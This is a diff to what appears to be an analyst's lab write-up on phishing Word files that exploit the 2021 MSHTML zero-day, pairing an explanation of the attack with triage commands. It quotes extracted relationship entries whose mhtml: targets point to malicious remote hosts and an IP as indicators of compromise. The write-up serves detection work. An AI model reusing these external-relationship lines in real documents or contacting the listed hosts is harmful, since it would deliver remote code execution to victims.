@@ -1,3 +1,27 @@
+🎯 Attack Logic (The Hacker's Trick)
+The Blueprint: The attacker distributes phishing documents disguised as standard Office files (.docx/.doc). 
+These files contain no malicious VBA or XLM macros, successfully bypassing automated email gateways 
+and signature-based antivirus scanners that only hunt for macro code.
+
+The Mechanism: The exploit leverages a critical vulnerability in the MSHTML (Internet Explorer) rendering 
+engine embedded within Microsoft Office. Inside the document's structure, the attacker embeds a malicious 
+External OLE Relationship. When a user opens the document, Office forces MSHTML to covertly contact a 
+remote server, download a weaponized HTML payload (containing obfuscated JavaScript), and execute arbitrary 
+code on the victim's machine.
+
+Evasion Technique: In this specific campaign, the attacker used extension spoofing 
+(e.g., saving a DOCX file structure but naming it .doc) to confuse defenders and static analysis tools.
+
+🕵️‍♂️ Investigation Process (How to Spot It)
+MIME/Type Verification: Inspect file extensions against their true underlying headers to detect extension 
+masquerading.
+Macro Validation: Run automated scanners to rule out standard macro-based delivery mechanisms.
+Archive Extraction: Unzip the Office Open XML structure (.docx) to manually audit hidden configuration profiles
+and external resource mapping files.
+
+Relationship Inspection: Parse the XML relationship definitions (.rels) to hunt for unauthorized, non-standard
+external links (IOCs) fetching remote code.
+
 2021's 0-Day MSHTML
 
 file Employee_W2_Form.docx
@@ -14,7 +38,8 @@ md5sum Work_From_Home_Survey.doc
 sha256sum Work_From_Home_Survey.doc
     84674acffba5101c8ac518019a9afe2a78a675ef3525a44dceddeed8a0092c69
 file Work_From_Home_Survey.doc
-    DOCX
+    DOCX - The file layout returns DOCX, exposing an active spoofing attempt since its extension was falsely 
+set to .doc.
 
 
 file Employee_W2_Form.docx
@@ -34,7 +59,7 @@ file
     DOCX
 
 olevba Employee_W2_Form.docx
-# → No macros found
+# → No macros found - This shifts the focus toward exploit-based delivery mechanisms.
 
 unzip Employee_W2_Form.docx -d extracted_docx2
 cd extracted_docx2/word/_rels
@@ -84,3 +109,11 @@ cd extracted_docx3/word/_rels
 cat document.xml.rels
 result
 Target="mhtml:http://hidusi.com/e8c76295a5f9acb7/side.html!x-usc:http://hidusi.com/e8c76295a5f9acb7/side.html"
+
+        Extract Remote Payloads and Network IOCs
+cat document.xml.rels
+Employee_W2_Form.docx ➜ Target="mhtml:arsenal.30cm.tw:1212/word.html..." - unusual port 1212
+Employees_Contact_Audit_Oct_2021.docx ➜ Target="mhtml:http://175.24.190..." - ip insted of domen name indicates compromised 
+endpoint
+Income_tax_and_benefit_return_2021.docx ➜ Target="mhtml:http://hidusi.com..." - Web mimicry—often called a copycat or spoofed
+website
